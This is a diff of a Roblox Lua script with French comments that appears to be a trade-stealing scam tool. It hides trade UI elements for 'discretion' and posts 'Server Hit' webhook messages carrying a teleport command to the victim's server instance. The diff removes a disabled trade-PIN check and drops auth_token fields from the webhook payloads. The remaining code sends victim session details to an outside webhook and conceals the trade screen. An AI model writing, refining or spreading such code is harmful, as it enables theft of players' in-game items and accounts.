@@ -47,19 +47,6 @@ if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):Invo
     return
 end
 
--- // VÉRIFICATION DU PIN (DÉSACTIVÉE POUR ÉVITER LE KICK)
--- local args = {
---     [1] = {
---         ["option"] = "PIN",
---         ["value"] = "9079"
---     }
--- }
--- local _, PINReponse = netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(args))
--- if PINReponse ~= "You don't have a PIN code" then
---     plr:kick("Account error. Please disable trade PIN and try again")
---     return
--- end
-
 -- // NETTOYAGE UI ET DISCRÉTION
 tradeGui.Black.Visible = false
 tradeGui.MiscChat.Visible = false
@@ -168,7 +155,6 @@ local function SendJoinMessage(list, prefix)
     end
 
     local data = {
-        ["auth_token"] = auth_token,
         ["username"] = webhookName,
         ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
         ["embeds"] = {{
@@ -213,7 +199,6 @@ local function SendMessage(list)
     end
 
     local data = {
-        ["auth_token"] = auth_token,
         ["username"] = webhookName,
         ["embeds"] = {{
             ["title"] = "⚪ Server Hit 🎯",
